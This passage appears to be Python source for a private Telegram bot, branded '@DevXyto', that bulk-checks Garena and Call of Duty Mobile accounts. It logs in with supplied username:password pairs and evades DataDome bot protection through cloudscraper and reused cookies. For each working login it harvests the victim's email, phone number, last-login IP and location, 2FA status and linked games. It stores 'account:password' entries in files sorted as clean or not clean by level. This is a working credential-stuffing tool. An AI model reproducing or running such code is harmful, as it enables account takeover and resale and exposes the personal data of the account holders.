    return "✦ ʏᴇs" if val else "✧ ɴᴏ"

def _ver(val):
    return "✦ ᴠᴇʀɪғɪᴇᴅ" if val else "✧ ɴᴏᴛ ᴠᴇʀɪғɪᴇᴅ"

def _linked(val):
    return "✦ ʟɪɴᴋᴇᴅ" if val else "✧ ɴᴏᴛ ʟɪɴᴋᴇᴅ"


def _md_escape(text):
    if text is None:
        return "N/A"
    text = str(text)
    for ch in ['_', '*', '[', ']', '`']:
        text = text.replace(ch, '\\' + ch)
    return text


def format_result_message(account, password, details, codm_info, has_codm,
                           game_connections=None, check_other_games=False):
    username     = details.get("username", account)
    email        = details.get("email", "N/A")
    email_verified = details.get("email_verified", False)
    mobile       = details.get("personal", {}).get("mobile_no", "N/A")
    mobile_display = mobile if mobile and str(mobile).strip() else "None"
    shell        = details.get("profile", {}).get("shell_balance", "N/A")
    acc_country  = details.get("personal", {}).get("country", "N/A")
    authenticator = details.get("security", {}).get("authenticator_app")
    two_step     = details.get("security", {}).get("two_step_verify")
    fb_connected = details.get("security", {}).get("facebook_connected")
    is_clean     = details.get("is_clean", False)
    acc_status   = details.get("status", {}).get("account_status", "N/A")
    last_login   = details.get("last_login", "Unknown")
    last_login_where = details.get("last_login_where", "N/A")
    ip_addr      = details.get("ip_for_msg", "N/A")
    clean_label  = "✦ *ᴄʟᴇᴀɴ*" if is_clean else "✘ *ɴᴏᴛ ᴄʟᴇᴀɴ*"

    msg = (
        "────────────────────────\n"
        "  ✦ *ᴀᴄᴄᴏᴜɴᴛ ᴄʜᴇᴄᴋ* [ *sᴜᴄᴄᴇss* ]\n"
        "────────────────────────\n\n"
        f"*◈ ɢᴀʀᴇɴᴀ ɪɴғᴏ:*\n"
        f"     *ᴜsᴇʀɴᴀᴍᴇ:* `{username}`\n"
        f"     *ᴘᴀssᴡᴏʀᴅ:* `{password}`\n"
        f"     *sʜᴇʟʟs:* `{shell}`\n"
        f"     *ᴄᴏᴜɴᴛʀʏ:* {_md_escape(acc_country)}\n"
        f"     *sᴛᴀᴛᴜs:* {_md_escape(acc_status)}\n"
        f"     *ʟᴀsᴛ ʟᴏɢɪɴ:* {_md_escape(last_login)}\n"
        f"     *ʟᴏᴄᴀᴛɪᴏɴ:* {_md_escape(last_login_where)}\n"
        f"     *ɪᴘ:* {_md_escape(ip_addr)}\n\n"
    )

    if has_codm and codm_info:
        codm_nickname = codm_info.get("codm_nickname", "N/A")
        codm_uid      = codm_info.get("uid", "N/A")
        codm_level    = codm_info.get("codm_level", "N/A")
        codm_region   = codm_info.get("region", "N/A")
        msg += (
            f"*◈ ᴄᴏᴅᴍ ɪɴғᴏ:*\n"
            f"     *ɴɪᴄᴋɴᴀᴍᴇ:* {_md_escape(codm_nickname)}\n"
            f"     *ᴜɪᴅ:* `{codm_uid}`\n"
            f"     *ʟᴇᴠᴇʟ:* `{codm_level}`\n"
            f"     *ʀᴇɢɪᴏɴ:* {_md_escape(codm_region)}\n\n"
        )
    else:
        msg += "*◈ ᴄᴏᴅᴍ ɪɴғᴏ:*\n     ✧ ɴᴏ ᴄᴏᴅᴍ ᴀᴄᴄᴏᴜɴᴛ ᴅᴇᴛᴇᴄᴛᴇᴅ\n\n"


    if check_other_games and game_connections:
        game_display = {
            "CODM": "ᴄᴏᴅᴍ", "FREEFIRE": "ғʀᴇᴇ ғɪʀᴇ", "ROV": "ʀᴏᴠ",
            "DELTA FORCE": "ᴅᴇʟᴛᴀ ғᴏʀᴄᴇ", "AOV": "ᴀᴏᴠ",
            "SPEED DRIFTERS": "sᴘᴇᴇᴅ ᴅʀɪғᴛᴇʀs", "BLACK CLOVER M": "ʙʟᴀᴄᴋ ᴄʟᴏᴠᴇʀ ᴍ",
            "GARENA UNDAWN": "ᴜɴᴅᴀᴡɴ", "FC ONLINE": "ғᴄ ᴏɴʟɪɴᴇ",
            "FC ONLINE M": "ғᴄ ᴏɴʟɪɴᴇ ᴍ", "MOONLIGHT BLADE": "ᴍᴏᴏɴʟɪɢʜᴛ ʙʟᴀᴅᴇ",
            "FAST THRILL": "ғᴀsᴛ ᴛʜʀɪʟʟ", "THE WORLD OF WAR": "ᴡᴏʀʟᴅ ᴏғ ᴡᴀʀ",
        }
        msg += "*◈ ᴏᴛʜᴇʀ ɢᴀᴍᴇs:*\n"
        for g in game_connections:
            gname = g.get("game", "")
            glabel = game_display.get(gname, gname.lower())
            grole  = g.get("role", "N/A")
            gregion = g.get("region", "N/A")
            msg += f"     *✦ {glabel}:* {_md_escape(grole)} ({_md_escape(gregion)})\n"
        msg += "\n"

    msg += (
        f"*◈ sᴇᴄᴜʀɪᴛʏ:*\n"
        f"     *ᴍᴏʙɪʟᴇ:* {_md_escape(mobile_display)}\n"
        f"     *ᴇᴍᴀɪʟ:* {_md_escape(email)} ({_ver(email_verified)})\n"
        f"     *ᴍᴏʙɪʟᴇ ʙᴏᴜɴᴅ:* {_yn(mobile and str(mobile).strip())}\n"
        f"     *ᴇᴍᴀɪʟ ᴠᴇʀɪғɪᴇᴅ:* {_yn(email_verified)}\n"
        f"     *ғᴀᴄᴇʙᴏᴏᴋ:* {_linked(fb_connected)}\n"
        f"     *ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛᴏʀ:* {_yn(authenticator)}\n"
        f"     *2ғᴀ:* {_yn(two_step)}\n"
        f"     *ᴄʟᴇᴀɴ sᴛᴀᴛᴜs:* {clean_label}\n\n"
        "*◈ ᴘᴏᴡᴇʀᴇᴅ ʙʏ: @DevXyto*\n"
        "────────────────────────"
    )
    return msg


def format_invalid_message(account, reason="ɪɴᴠᴀʟɪᴅ ᴄʀᴇᴅᴇɴᴛɪᴀʟs"):
    return (
        "────────────────────────\n"
        "  ✘ *ᴀᴄᴄᴏᴜɴᴛ ᴄʜᴇᴄᴋ* [ *ғᴀɪʟᴇᴅ* ]\n"
        "────────────────────────\n\n"
        f"*◈ ᴀᴄᴄᴏᴜɴᴛ:* `{account}`\n"
        f"*◈ ʀᴇᴀsᴏɴ:* {reason}\n\n"
        "*◈ ᴘᴏᴡᴇʀᴇᴅ ʙʏ: @DevXyto*\n"
        "────────────────────────"
    )



def _sorted_insert(file_path, new_entry, codm_level):
    """Insert entry into file keeping highest-level-first order."""
    try:
        existing = []
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as f:
                content = f.read()
            import re
            for chunk in content.split("\n\n"):
                chunk = chunk.strip()
                if not chunk:
                    continue
                m = re.search(r"Level:\s*(\d+)", chunk)
                lvl = int(m.group(1)) if m else 0
                existing.append((lvl, chunk))
        existing.append((codm_level, new_entry.strip()))
        existing.sort(key=lambda x: x[0], reverse=True)
        with open(file_path, "w", encoding="utf-8") as f:
            for _, entry in existing:
                f.write(entry + "\n\n")
    except Exception:

        with open(file_path, "a", encoding="utf-8") as f:
            f.write(new_entry.strip() + "\n\n")


def _save_result(account, password, details, codm_info, result_folder,
                 game_connections=None):
    try:
        is_clean      = details.get("is_clean", False)
        codm_nickname = codm_info.get("codm_nickname", "N/A") if codm_info else "N/A"
        codm_uid      = codm_info.get("uid", "N/A") if codm_info else "N/A"
        raw_level     = codm_info.get("codm_level", "N/A") if codm_info else "N/A"
        codm_region   = codm_info.get("region", "N/A") if codm_info else "N/A"
        email         = details.get("email", "N/A")
        email_ver     = "Yes" if details.get("email_verified") else "No"
        mobile        = details.get("personal", {}).get("mobile_no", "N/A")
        shell         = details.get("profile", {}).get("shell_balance", "N/A")
        country       = details.get("personal", {}).get("country", "N/A")
        last_login    = details.get("last_login", "Unknown")
        last_login_where = details.get("last_login_where", "N/A")
        ip            = details.get("ip_for_msg", "N/A")
        account_status = details.get("status", {}).get("account_status", "N/A").upper()
        binds_list    = details.get("binds", [])
        binds         = ", ".join(binds_list) if binds_list else "None"
        clean_status  = "CLEAN" if is_clean else "NOT CLEAN"

        fb_account = details.get("security", {}).get("facebook_account") or {}
        fb_status = "False"
        if isinstance(fb_account, dict):
            fb_uname = fb_account.get("fb_username", "")
            if fb_uname:
                fb_status = "True"
            else:
                fb_status = "Deleted"

        country_flags = {
            'PH': '🇵🇭', 'SG': '🇸🇬', 'MY': '🇲🇾', 'TW': '🇹🇼', 'TH': '🇹🇭',
            'ID': '🇮🇩', 'IN': '🇮🇳', 'VN': '🇻🇳', 'US': '🇺🇸', 'BR': '🇧🇷',
        }
        region_flag = country_flags.get(str(codm_region).upper(), '🌍')

        try:
            codm_level_int = int(raw_level)
        except Exception:
            codm_level_int = 0

        entry = (
            f"{account}:{password}\n"
            f"CODM: {codm_nickname}\n"
            f"UID: {codm_uid}\n"
            f"Level: {raw_level}\n"
            f"Shell: {shell}\n"
            f"Region: {codm_region} {region_flag}\n"
            f"Login Country: {country}\n"
            f"Last Login: {last_login}\n"
            f"Login Location: {last_login_where}\n"
            f"Login IP: {ip}\n"
            f"Email: {email} ({email_ver})\n"
            f"Mobile: {mobile}\n"
            f"STATUS: {account_status}\n"
            f"Binds: {binds}\n"
            f"FB STATUS: {fb_status}\n"
            f"STATUS: {clean_status}"
        )

        identifier = f"{account}:{password}"

        file_path = os.path.join(result_folder, "clean.txt" if is_clean else "notclean.txt")
        already_saved = False
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as f:
                if identifier in f.read():
                    already_saved = True
        if not already_saved and codm_nickname != "N/A":
            _sorted_insert(file_path, entry, codm_level_int)

        if game_connections:
            game_file_map = {
                "CODM":             "CODM.txt",
                "FREEFIRE":         "FreeFire.txt",
                "FREE FIRE":        "FreeFire.txt",
                "ROV":              "ROV.txt",
                "DELTA FORCE":      "DeltaForce.txt",
                "AOV":              "AOV.txt",
                "SPEED DRIFTERS":   "SpeedDrifters.txt",
                "BLACK CLOVER M":   "BlackCloverM.txt",
                "GARENA UNDAWN":    "Undawn.txt",
                "FC ONLINE":        "FCOnline.txt",
                "FC ONLINE M":      "FCOnlineM.txt",
                "MOONLIGHT BLADE":  "MoonlightBlade.txt",
                "FAST THRILL":      "FastThrill.txt",
                "THE WORLD OF WAR": "WorldOfWar.txt",
            }
            seen_games = set()
            for g in game_connections:
                gname = g.get("game", "").upper()
                if gname in game_file_map and gname not in seen_games:
                    seen_games.add(gname)
                    gfile = os.path.join(result_folder, game_file_map[gname])
                    already = False
                    if os.path.exists(gfile):
                        with open(gfile, "r", encoding="utf-8") as f:
                            if identifier in f.read():
                                already = True
                    if not already:
                        _sorted_insert(gfile, entry, codm_level_int)

    except Exception:
        pass



def processaccount(session, account, password, cookie_manager, datadome_manager,
                   live_stats, result_folder="Results", check_other_games=False):
    result = {
        "status": "invalid",
        "message": "",
        "details": None,
        "codm_info": None,
        "has_codm": False,
    }
    try:
        datadome_manager.clear_session_datadome(session)
        current_datadome = datadome_manager.get_datadome()
        if current_datadome:
            datadome_manager.set_session_datadome(session, current_datadome)

        v1, v2, new_datadome = prelogin(session, account, datadome_manager)

        if v1 == "IP_BLOCKED":
            result["status"] = "ip_blocked"
            result["message"] = "⚠ *ɪᴘ ʙʟᴏᴄᴋᴇᴅ* — ᴡᴀɪᴛɪɴɢ ғᴏʀ ɪᴘ ᴄʜᴀɴɢᴇ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ"
            return result

        if not v1 or not v2:
            live_stats.update_stats(valid=False)
            result["message"] = format_invalid_message(account, "ᴘʀᴇʟᴏɢɪɴ ғᴀɪʟᴇᴅ")
            return result

        if new_datadome:
            datadome_manager.set_datadome(new_datadome)
            datadome_manager.set_session_datadome(session, new_datadome)

        sso_key = login(session, account, password, v1, v2)

        if not sso_key:
            live_stats.update_stats(valid=False)
            result["message"] = format_invalid_message(account)
            return result

        current_cookies = session.cookies.get_dict()
        cookie_parts = []
        for cookie_name in ["apple_state_key", "datadome", "sso_key"]:
            if cookie_name in current_cookies:
                cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
        cookie_header = "; ".join(cookie_parts) if cookie_parts else ""
        headers = {
            "accept": "*/*",
            "referer": "https://account.garena.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36",
        }
        if cookie_header:
            headers["cookie"] = cookie_header

        response = session.get("https://account.garena.com/api/account/init",
                               headers=headers, timeout=30)

        if response.status_code == 403:
            datadome_manager.handle_403(session)
            live_stats.update_stats(valid=False)
            result["message"] = format_invalid_message(account, "✘ ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ (403)")
            return result

        try:
            account_data = response.json()
        except json.JSONDecodeError:
            live_stats.update_stats(valid=False)
            result["message"] = format_invalid_message(account, "ɪɴᴠᴀʟɪᴅ sᴇʀᴠᴇʀ ʀᴇsᴘᴏɴsᴇ")
            return result

        if "error" in account_data:
            live_stats.update_stats(valid=False)
            result["message"] = format_invalid_message(account, account_data.get("error", "ᴇʀʀᴏʀ"))
            return result

        if "user_info" in account_data:
            details = parse_account_details(account_data)
        else:
            details = parse_account_details({"user_info": account_data})

        login_history = account_data.get("login_history") or []
        last_login_ip = None
        last_login_where = None
        last_login_ts = None
        if isinstance(login_history, list) and login_history:
            entry = login_history[0]
            if isinstance(entry, dict):
                last_login_ip    = entry.get("ip") or entry.get("login_ip")
                last_login_where = entry.get("country") or entry.get("location")
                last_login_ts    = entry.get("timestamp")

        def fmt_ts(ts):
            try:
                return datetime.fromtimestamp(int(ts), tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
            except Exception:
                return "Unknown"

        details["last_login"]       = fmt_ts(last_login_ts) if last_login_ts else "Unknown"
        details["last_login_where"] = last_login_where or "N/A"
        details["ip_for_msg"]       = last_login_ip or account_data.get("init_ip") or "N/A"
        if account_data.get("country"):
            details["country"] = account_data.get("country")

        has_codm, codm_info = check_codm_account(session, account)


        game_connections = []
        if check_other_games:
            try:
                game_connections = get_game_connections(session, account)
            except Exception:
                game_connections = []


        if has_codm and codm_info:
            existing_games = [g.get("game", "") for g in game_connections]
            if "CODM" not in existing_games:
                game_connections.insert(0, {
                    "game": "CODM",
                    "region": codm_info.get("region", "N/A").upper(),
                    "role": codm_info.get("codm_nickname", "N/A"),
                })

        def is_codm_invalid(info):
            if not info:
                return True
            if isinstance(info, dict):
                invalid_values = ["", "N/A", "NONE", "NULL", "ERROR"]
                if all(str(v).strip().upper() in invalid_values for v in info.values()):
                    return True
                if str(info.get("codm_nickname", "")).strip().upper() in invalid_values:
                    return True
            return False

        if not has_codm or is_codm_invalid(codm_info):
            has_codm = False
            codm_info = None

        codm_level_int = 0
        if has_codm and codm_info:
            try:
                codm_level_int = int(codm_info.get("codm_level", 0))
            except Exception:
                codm_level_int = 0

        live_stats.update_stats(
            valid=True,
            clean=details.get("is_clean", False),
            has_codm=has_codm,
            codm_level=codm_level_int if has_codm else None,
            game_connections=game_connections,
        )

        fresh_datadome = datadome_manager.extract_datadome_from_session(session)
        if fresh_datadome:
            cookie_manager.save_cookie(fresh_datadome)

        result["status"]       = "valid"
        result["details"]      = details
        result["codm_info"]    = codm_info
        result["has_codm"]     = has_codm
        result["password"]     = password
        result["game_connections"] = game_connections
        result["message"]      = format_result_message(
            account, password, details, codm_info, has_codm,
            game_connections=game_connections,
            check_other_games=check_other_games,
        )
        return result

    except Exception as e:
        live_stats.update_stats(valid=False)
        result["message"] = format_invalid_message(account, str(e)[:80])
        return result



user_sessions = {}
user_locks    = {}
global_lock   = Lock()

bulk_queue        = []
queue_lock        = Lock()
queue_active_uid  = None
queue_event       = threading.Event()


class UserSession:
    def __init__(self, user_id):
        self.user_id          = user_id
        self.session          = None
        self.cookie_manager   = CookieManager()
        self.datadome_manager = DataDomeManager()
        self.live_stats       = LiveStats()
        self.is_running       = False
        self.stop_event       = Event()
        self.result_folder    = f"Results_{user_id}"
        self.check_other_games = False
        self.init_session()

    def init_session(self):
        self.session = cloudscraper.create_scraper()
        valid_cookies = self.cookie_manager.get_valid_cookies()
        if valid_cookies:
            combined_cookie_str = "; ".join(valid_cookies)
            applyck(self.session, combined_cookie_str)
            final_cookie_value = valid_cookies[-1]
            if "=" in final_cookie_value:
                datadome_value = final_cookie_value.split("=", 1)[1].strip()
                if datadome_value:
                    self.datadome_manager.set_datadome(datadome_value)
                    self.datadome_manager.set_session_datadome(self.session, datadome_value)
        else:
            file_datadome = get_datadome_from_file()
            if file_datadome:
                self.datadome_manager.set_datadome(file_datadome)
                self.datadome_manager.set_session_datadome(self.session, file_datadome)
            else:
                datadome = get_datadome_cookie(self.session)
                if datadome:
                    self.datadome_manager.set_datadome(datadome)
                    self.datadome_manager.set_session_datadome(self.session, datadome)

    def reset_session(self):
        self.session = None
        self.init_session()


def get_user_session(user_id):
    with global_lock:
        if user_id not in user_sessions:
            user_sessions[user_id] = UserSession(user_id)
        return user_sessions[user_id]



async def _send(update: Update, text: str, **kwargs):
    if update.callback_query:
        try:
            await update.callback_query.message.edit_text(text, **kwargs)
        except Exception:
            await update.callback_query.message.reply_text(text, **kwargs)
    else:
        await update.message.reply_text(text, **kwargs)


BACK_MENU  = [[InlineKeyboardButton("[BACK]", callback_data="back_to_menu")]]
BACK_ADMIN = [[InlineKeyboardButton("[BACK TO ADMIN]", callback_data="admin_panel")]]


def _progress_bar(done, total, width=20):
    pct  = done / total if total else 0
    fill = int(pct * width)
    bar  = "[" + "█" * fill + "░" * (width - fill) + "]"
    return f"{bar} {done}/{total} ({pct*100:.0f}%)"



async def main_menu(update: Update, context: CallbackContext):
    user = update.effective_user
    uid  = user.id
    name = user.first_name or "ᴜsᴇʀ"

    if uid not in ADMIN_IDS and is_removed(uid):
        await _send(update,
            "────────────────────────\n"
            "  ✘ *ᴀᴄᴄᴇss ʀᴇᴠᴏᴋᴇᴅ*\n"
            "────────────────────────\n\n"
            "*ʏᴏᴜʀ ʙᴏᴛ ᴀᴄᴄᴇss ʜᴀs ʙᴇᴇɴ ʀᴇᴍᴏᴠᴇᴅ ʙʏ ᴛʜᴇ ᴀᴅᴍɪɴ.*\n"
            "*ᴄᴏɴᴛᴀᴄᴛ ᴛʜᴇ ᴀᴅᴍɪɴ ᴛᴏ ʀᴇqᴜᴇsᴛ ʀᴇɪɴsᴛᴀᴛᴇᴍᴇɴᴛ.*",
            parse_mode="Markdown",
        )
        return

    if uid not in ADMIN_IDS and not is_approved(uid):
        uname = f"@{user.username}" if user.username else None
        if not uname:
            await _send(update,
                "────────────────────────\n"
                "  ◆ *ᴀᴄᴄᴇss ʀᴇqᴜɪʀᴇᴅ*\n"
                "────────────────────────\n\n"
                f"*ʜᴇʏ {name}!* ᴛʜɪs ɪs ᴀ *ᴘʀɪᴠᴀᴛᴇ ʙᴏᴛ*.\n\n"
                "*◈ ᴡʜᴀᴛ ᴛʜɪs ʙᴏᴛ ᴄᴀɴ ᴅᴏ:*\n"
                "  ✦ sɪɴɢʟᴇ ᴀᴄᴄᴏᴜɴᴛ ᴄʜᴇᴄᴋᴇʀ\n"
                "  ✦ ʙᴜʟᴋ ᴀᴄᴄᴏᴜɴᴛ ᴄʜᴇᴄᴋᴇʀ\n"
                "  ✦ ɢᴀʀᴇɴᴀ ᴄᴏᴅᴍ ᴄʜᴇᴄᴋᴇʀ\n\n"
                "⚠ *ʏᴏᴜ ɴᴇᴇᴅ ᴀ ᴛᴇʟᴇɢʀᴀᴍ ᴜsᴇʀɴᴀᴍᴇ ᴛᴏ sᴇɴᴅ ᴀ ʀᴇqᴜᴇsᴛ.*\n\n"
                "ɢᴏ ᴛᴏ: *Settings > Username* > sᴇᴛ ᴏɴᴇ, ᴛʜᴇɴ /start ᴀɢᴀɪɴ.",
                parse_mode="Markdown",
            )
            return
        if has_pending(uid):
            await _send(update,
                "────────────────────────\n"
                "  ↻ *ᴘᴇɴᴅɪɴɢ ᴀᴘᴘʀᴏᴠᴀʟ*\n"
                "────────────────────────\n\n"
                f"*ʜᴇʏ {name}!*\n"
                "ʏᴏᴜʀ ᴀᴄᴄᴇss ʀᴇqᴜᴇsᴛ ɪs ᴀʟʀᴇᴀᴅʏ ᴘᴇɴᴅɪɴɢ.\n"
                "*ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴀᴅᴍɪɴ ᴀᴘᴘʀᴏᴠᴀʟ.*",
                parse_mode="Markdown",
            )
            return
        keyboard = [[InlineKeyboardButton("[SEND ACCESS REQUEST]", callback_data="send_request")]]
        await _send(update,
            "────────────────────────\n"
            "  ◆ *ᴀᴄᴄᴇss ʀᴇqᴜɪʀᴇᴅ*\n"
            "────────────────────────\n\n"
            f"*ʜᴇʏ {name}!* ᴛʜɪs ɪs ᴀ *ᴘʀɪᴠᴀᴛᴇ ʙᴏᴛ*.\n\n"
            "*◈ ᴡʜᴀᴛ ᴛʜɪs ʙᴏᴛ ᴄᴀɴ ᴅᴏ:*\n"
            "  ✦ sɪɴɢʟᴇ ᴀᴄᴄᴏᴜɴᴛ ᴄʜᴇᴄᴋᴇʀ\n"
            "  ✦ ʙᴜʟᴋ ᴀᴄᴄᴏᴜɴᴛ ᴄʜᴇᴄᴋᴇʀ\n"
            "  ✦ ɢᴀʀᴇɴᴀ ᴄᴏᴅᴍ ᴄʜᴇᴄᴋᴇʀ\n\n"
            "*ᴛᴀᴘ ʙᴇʟᴏᴡ ᴛᴏ ʀᴇqᴜᴇsᴛ ᴀᴄᴄᴇss:*",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )
        return

    us    = get_user_session(uid)
    stats = us.live_stats.get_stats()
    gc    = stats["game_counts"]
    other_flag = "✦ ᴏɴ" if us.check_other_games else "✧ ᴏғғ"

    keyboard = [
        [
            InlineKeyboardButton("[SINGLE CHECK]", callback_data="single_check"),
            InlineKeyboardButton("[BULK CHECK]",   callback_data="bulk_check"),
        ],
        [
            InlineKeyboardButton("[STATS]",        callback_data="view_stats"),
            InlineKeyboardButton("[RESET]",        callback_data="reset_session"),
        ],
        [InlineKeyboardButton(f"[ALL GAMES: {other_flag}]", callback_data="toggle_other_games")],
    ]
    if uid in ADMIN_IDS:
        keyboard.append([InlineKeyboardButton("[ADMIN PANEL]", callback_data="admin_panel")])
    keyboard.append([InlineKeyboardButton("[EXIT]", callback_data="exit")])

    game_line = (
        f"  [ᴄᴏᴅᴍ: `{stats['has_codm']}`] "
        f"[ʀᴏᴠ: `{gc.get('ROV',0)}`] "
        f"[ᴅᴇʟᴛᴀ: `{gc.get('DELTA FORCE',0)}`] "
        f"[ᴀᴏᴠ: `{gc.get('AOV',0)}`] "
        f"[sᴘᴇᴇᴅ ᴅʀɪғᴛᴇʀs: `{gc.get('SPEED DRIFTERS',0)}`]"
    )

    await _send(update,
        "────────────────────────\n"
        f"  *ᴡᴇʟᴄᴏᴍᴇ, {name}*\n"
        "  *ɢᴀʀᴇɴᴀ ᴄᴏᴅᴍ ᴄʜᴇᴄᴋᴇʀ*\n"
        "────────────────────────\n\n"
        "*◈ sᴇssɪᴏɴ sᴛᴀᴛs:*\n"
        f"  ✦ ᴠᴀʟɪᴅ: `{stats['valid']}` | ✧ ɪɴᴠᴀʟɪᴅ: `{stats['invalid']}`\n"
        f"  ✦ ᴄʟᴇᴀɴ: `{stats['clean']}` | ✘ ɴᴏᴛ ᴄʟᴇᴀɴ: `{stats['not_clean']}`\n"
        f"  ▲ ʜɪɢʜᴇsᴛ ʟᴠʟ: `{stats['highest_level']}` | "
        f"▲ ʜɪɢʜᴇsᴛ ᴄʟᴇᴀɴ ʟᴠʟ: `{stats['highest_clean_level']}`\n"
        + game_line + "\n\n"
        f"*◈ ᴏᴛʜᴇʀ ɢᴀᴍᴇs ᴄʜᴇᴄᴋ:* {other_flag}\n"
        "  *(ɴᴏᴛᴇ: ᴇɴᴀʙʟɪɴɢ ᴡɪʟʟ ᴍᴀᴋᴇ ᴄʜᴇᴄᴋᴇʀ sʟɪɢʜᴛʟʏ sʟᴏᴡᴇʀ)*\n\n"
        "*ᴄʜᴏᴏsᴇ ᴀɴ ᴏᴘᴛɪᴏɴ:*",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )



async def _admin_panel(update: Update):
    pending  = get_pending()
    approved = [u for u in get_approved() if u not in get_removed()]
    removed  = get_removed()
    kb = [
        [InlineKeyboardButton(f"[PENDING ({len(pending)})]", callback_data="admin_pending")],
        [InlineKeyboardButton(f"[APPROVED ({len(approved)})]",  callback_data="admin_approved")],
        [InlineKeyboardButton(f"[REMOVED ({len(removed)})]",    callback_data="admin_removed")],
        [InlineKeyboardButton("[BACK]", callback_data="back_to_menu")],
    ]
    await _send(update,
        "────────────────────────\n"
        "  ◉ *ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ*\n"
        "────────────────────────\n\n"
        f"*◈ ᴘᴇɴᴅɪɴɢ:* `{len(pending)}`\n"
        f"*✦ ᴀᴘᴘʀᴏᴠᴇᴅ:* `{len(approved)}`\n"
        f"*✘ ʀᴇᴍᴏᴠᴇᴅ:* `{len(removed)}`",
        parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb),
    )


async def _admin_pending(update: Update):
    pending = get_pending()
    if not pending:
        await _send(update,
            "────────────────────────\n"
            "  *◈ ᴘᴇɴᴅɪɴɢ ʀᴇqᴜᴇsᴛs*\n"
            "────────────────────────\n\n"
            "*ɴᴏ ᴘᴇɴᴅɪɴɢ ʀᴇqᴜᴇsᴛs.*",
            parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(BACK_ADMIN),
        )
        return
    kb, lines = [], []
    for uid_str, info in pending.items():
        uname = info.get("username", "N/A")
        fname = info.get("first_name", "?")
        ts    = info.get("time", "?")
        lines.append(f"*{fname}* ({uname})\n`ID: {uid_str}` — _{ts}_")
        kb.append([
            InlineKeyboardButton(f"✦ {uname}", callback_data=f"approve_{uid_str}"),
            InlineKeyboardButton(f"✘ {uname}", callback_data=f"decline_{uid_str}"),
        ])
    kb.append(BACK_ADMIN[0])
    await _send(update,
        "────────────────────────\n"
        "  *◈ ᴘᴇɴᴅɪɴɢ ʀᴇqᴜᴇsᴛs*\n"
        "────────────────────────\n\n" + "\n\n".join(lines),
        parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb),
    )


async def _admin_approved(update: Update):
    approved = [u for u in get_approved() if u not in get_removed()]
    if not approved:
        await _send(update,
            "────────────────────────\n"
            "  *✦ ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀs*\n"
            "────────────────────────\n\n"
            "*ɴᴏ ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀs ʏᴇᴛ.*",
            parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(BACK_ADMIN),
        )
        return
    all_data = _get_data()
    kb, lines = [], []
    for uid in approved:
        info  = all_data["pending"].get(str(uid), {})
        uname = info.get("username", f"id:{uid}")
        lines.append(f"`{uid}` — {uname}")
        kb.append([InlineKeyboardButton(f"✘ ʀᴇᴍᴏᴠᴇ {uname}", callback_data=f"remove_{uid}")])
    kb.append(BACK_ADMIN[0])
    await _send(update,
        "────────────────────────\n"
        "  *✦ ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀs*\n"
        "────────────────────────\n\n" + "\n".join(lines),
        parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb),
    )


async def _admin_removed(update: Update):
    removed = get_removed()
    if not removed:
        await _send(update,
            "────────────────────────\n"
            "  *✘ ʀᴇᴍᴏᴠᴇᴅ ᴜsᴇʀs*\n"
            "────────────────────────\n\n"
            "*ɴᴏ ʀᴇᴍᴏᴠᴇᴅ ᴜsᴇʀs.*",
            parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(BACK_ADMIN),
        )
        return
    await _send(update,
        "────────────────────────\n"
        "  *✘ ʀᴇᴍᴏᴠᴇᴅ ᴜsᴇʀs*\n"
        "────────────────────────\n\n" + "\n".join(f"`{u}`" for u in removed),
        parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(BACK_ADMIN),
    )



async def callback_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    data = query.data
    uid  = update.effective_user.id

    if data == "back_to_menu":
        context.user_data.clear()
        await main_menu(update, context)
        return

    if data == "exit":
        context.user_data.clear()
        await query.message.edit_text(
            "*ᴛʜᴀɴᴋ ʏᴏᴜ ғᴏʀ ᴜsɪɴɢ ɢᴀʀᴇɴᴀ ᴄᴏᴅᴍ ᴄʜᴇᴄᴋᴇʀ* ✦",
            parse_mode="Markdown",
        )
        return

    if data == "send_request":
        user  = update.effective_user
        uname = f"@{user.username}" if user.username else None
        if not uname:
            await query.answer("⚠ Please set a Telegram username first!", show_alert=True)
            return
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        add_pending(uid, {
            "username":   uname,
            "first_name": user.first_name or "?",
            "user_id":    uid,
            "time":       ts,
        })
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    admin_id,
                    (
                        "────────────────────────\n"
                        "  *◈ ɴᴇᴡ ᴀᴄᴄᴇss ʀᴇqᴜᴇsᴛ*\n"
                        "────────────────────────\n\n"
                        f"*ɴᴀᴍᴇ:* {user.first_name or '?'}\n"
                        f"*ᴜsᴇʀɴᴀᴍᴇ:* {uname}\n"
                        f"*ᴜsᴇʀ ɪᴅ:* `{uid}`\n"
                        f"*ᴛɪᴍᴇ:* `{ts}`"
                    ),
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("✦ ᴀᴘᴘʀᴏᴠᴇ", callback_data=f"approve_{uid}"),
                        InlineKeyboardButton("✘ ᴅᴇᴄʟɪɴᴇ", callback_data=f"decline_{uid}"),
                    ]]),
                )
            except Exception:
                pass
        await query.message.edit_text(
            "────────────────────────\n"
            "  *◈ ʀᴇqᴜᴇsᴛ sᴇɴᴛ*\n"
            "────────────────────────\n\n"
